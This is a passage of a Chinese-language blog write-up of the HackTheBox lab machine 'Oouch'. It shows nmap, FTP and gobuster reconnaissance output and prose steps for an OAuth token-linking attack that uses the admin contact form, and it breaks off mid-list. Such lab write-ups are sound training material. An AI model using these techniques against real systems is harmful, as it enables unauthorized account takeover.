<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Oouch - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;231  10.10.10.177  端口扫描21,22,5000,8000： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
<meta property="og:type" content="article">
<meta property="og:title" content="Oouch - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2020/07/17/Oouch-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;231  10.10.10.177  端口扫描21,22,5000,8000： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071601.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071602.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071603.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071604.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071605.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071610.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071606.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071607.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071608.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071609.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071613.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071611.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071612.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071614.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071615.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071616.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071617.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071618.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071619.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071620.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071621.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071622.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071623.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071702.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071701.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071703.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071704.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071705.jpg">
<meta property="article:published_time" content="2020-07-17T06:36:57.000Z">
<meta property="article:modified_time" content="2020-08-03T00:28:30.943Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071601.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Oouch - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="搜尋">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Oouch - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-07-17T06:36:57.000Z" itemprop="datePublished" class="page-time">
  2020-07-17
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-177"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.177</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#21"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">21</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8000"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">8000</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5000"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">5000</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#oauth"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">oauth</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#document"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">document</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#concat"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">concat</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#攻击oauth"><span class="post-toc-number">4.</span> <span class="post-toc-text">攻击oauth</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#connect"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">connect</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#authorize"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">authorize</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#confirm-authorize"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">confirm authorize</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#token"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">token</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描-1"><span class="post-toc-number">5.</span> <span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#register"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">register</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SSRF"><span class="post-toc-number">6.</span> <span class="post-toc-text">SSRF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#new-application"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">new application</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#构造URL"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">构造URL</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SSRF-1"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">SSRF</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#qtc-cookie"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">qtc cookie</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#API"><span class="post-toc-number">7.</span> <span class="post-toc-text">API</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#get-ssh-key"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">get ssh key</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh-key"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">ssh key</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">8.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#搜集信息"><span class="post-toc-number">9.</span> <span class="post-toc-text">搜集信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#内网探测"><span class="post-toc-number">10.</span> <span class="post-toc-text">内网探测</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#code"><span class="post-toc-number">11.</span> <span class="post-toc-text">code</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dbus"><span class="post-toc-number">11.1.</span> <span class="post-toc-text">dbus</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#uswgi"><span class="post-toc-number">12.</span> <span class="post-toc-text">uswgi</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#uwsgi-exp"><span class="post-toc-number">12.1.</span> <span class="post-toc-text">uwsgi exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#dbus-exploit-get-root-flag"><span class="post-toc-number">13.</span> <span class="post-toc-text">dbus exploit get root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">14.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Oouch-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Oouch - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-07-17 14:36:57" datetime="2020-07-17T06:36:57.000Z"  itemprop="datePublished">2020-07-17</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><p><a href="https://www.hackthebox.eu/home/machines/profile/231" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/231</a></p>
</li>
<li><h2 id="10-10-10-177"><a href="#10-10-10-177" class="headerlink" title="10.10.10.177"></a>10.10.10.177</h2></li>
</ul>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>21,22,5000,8000：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.10.10.177</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 13:05 CST</span><br><span class="line">WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value</span><br><span class="line">Nmap scan report for 10.10.10.177</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.14.32</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      Session bandwidth limit in byte/s is 30000</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)</span><br><span class="line">|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)</span><br><span class="line">5000/tcp open  http    nginx 1.14.2</span><br><span class="line">| http-title: Welcome to Oouch</span><br><span class="line">|_Requested resource was http://10.10.10.177:5000/login?next=%2F</span><br><span class="line">8000/tcp open  rtsp</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest, GetRequest, HTTPOptions:</span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|   RTSPRequest:</span><br><span class="line">|     RTSP/1.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|   SIPOptions:</span><br><span class="line">|     SIP/2.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|_    &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">|_rtsp-methods: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8000-TCP:V=7.80%I=7%D=7/16%Time=5F0FE03A%P=x86_64-apple-darwin18.6.</span><br><span class="line">SF:0%r(GetRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\</span><br><span class="line">SF:x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(4</span><br><span class="line">SF:00\)&lt;/h1&gt;")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\</span><br><span class="line">SF:r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\</span><br><span class="line">SF:x20Request\x20\(400\)&lt;/h1&gt;")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\</span><br><span class="line">SF:x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\</span><br><span class="line">SF:r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(RTSPRequest,64,"RTSP/1\.0\x20</span><br><span class="line">SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authori</span><br><span class="line">SF:zation\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(SIPOptions,63,"SIP</span><br><span class="line">SF:/2\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x</span><br><span class="line">SF:20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;");</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 66.68 seconds</span><br></pre></td></tr></table></figure>

<h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p>21 FTP可以匿名登录，没什么信息,   注意有个模式问题报错，自己改一下就可以：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  Oouch ftp 10.10.10.177</span><br><span class="line">Connected to 10.10.10.177.</span><br><span class="line">220 qtc's development server</span><br><span class="line">Name (10.10.10.177:miao): anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">500 Illegal PORT command.</span><br><span class="line">ftp: bind: Address already in use</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> quote pasv</span></span><br><span class="line">227 Entering Passive Mode (10,10,10,177,191,185).</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> passive</span></span><br><span class="line">Passive mode on.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">227 Entering Passive Mode (10,10,10,177,184,218).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get project.txt</span></span><br><span class="line">local: project.txt remote: project.txt</span><br><span class="line">227 Entering Passive Mode (10,10,10,177,183,137).</span><br><span class="line">150 Opening BINARY mode data connection for project.txt (49 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">49 bytes received in 0.00 secs (354.4560 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line">221 Goodbye.</span><br><span class="line"></span><br><span class="line">➜  Oouch cat project.txt</span><br><span class="line">Flask -&gt; Consumer</span><br><span class="line">Django -&gt; Authorization Servers</span><br></pre></td></tr></table></figure>

<h2 id="8000"><a href="#8000" class="headerlink" title="8000"></a>8000</h2><p> 直接访问是一个错误页面</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071601.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h2><p>简单的注册登录：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071602.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>随意注册登录，如果500那就是服务炸了，reset一下机器：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071603.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  Oouch gobuster dir -u http://10.10.10.177:5000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.177:5000/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/07/11 15:41:16 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/about (Status: 302)</span><br><span class="line">/contact (Status: 302)</span><br><span class="line">/documents (Status: 302)</span><br><span class="line">/home (Status: 302)</span><br><span class="line">/login (Status: 200)</span><br><span class="line">/logout (Status: 302)</span><br><span class="line">/oauth (Status: 302)</span><br><span class="line">/profile (Status: 302)</span><br><span class="line">/register (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2020/07/11 15:43:01 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h2 id="oauth"><a href="#oauth" class="headerlink" title="oauth"></a>oauth</h2><p>这里会有一些新的子域名，自己加hosts：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.177 oouch.htb consumer.oouch.htb authorization.oouch.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071604.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>点击第一个connect链接，登录后会跳转到下面这个：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071605.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>所以整个系统应该就是oauth相关，5000是flask，8000是Django，我们应该以某种方式将管理员账号与我们自己的账号绑定。</p>
<p>oauth安全相关资料：</p>
<ul>
<li>Attacking the OAuth Protocol - Dhaval Kapil<br><a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/</a></li>
</ul>
<h2 id="document"><a href="#document" class="headerlink" title="document"></a>document</h2><p>提示只有管理员可以查看，所以就是需要某种方式得到管理员账号权限：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071610.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h2><p>这里是提交内容管理员账号会自动查看，可能存在SSRF：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071606.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="攻击oauth"><a href="#攻击oauth" class="headerlink" title="攻击oauth"></a>攻击oauth</h1><ol>
<li>首先在Authorization.oouch.htb:8000注册一个账号：</li>
</ol>
<p>首先在这里注册一个账号：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071607.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ol start="2">
<li>访问<a href="http://consumer.oouch.htb:5000/oauth/connect，进行connect，会在connect和authorize两个请求后跳转到确认界面：" target="_blank" rel="noopener">http://consumer.oouch.htb:5000/oauth/connect，进行connect，会在connect和authorize两个请求后跳转到确认界面：</a></li>
</ol>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071608.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ol start="3">
<li>confirm authorize</li>
<li>Get token,注意这个请求需要直接drop掉，因为token只有一次有效，我们保存后直接drop掉请求</li>
<li>SSRF，将第4步的请求URL通过contact发给管理员</li>
</ol>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071609.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ol start="6">
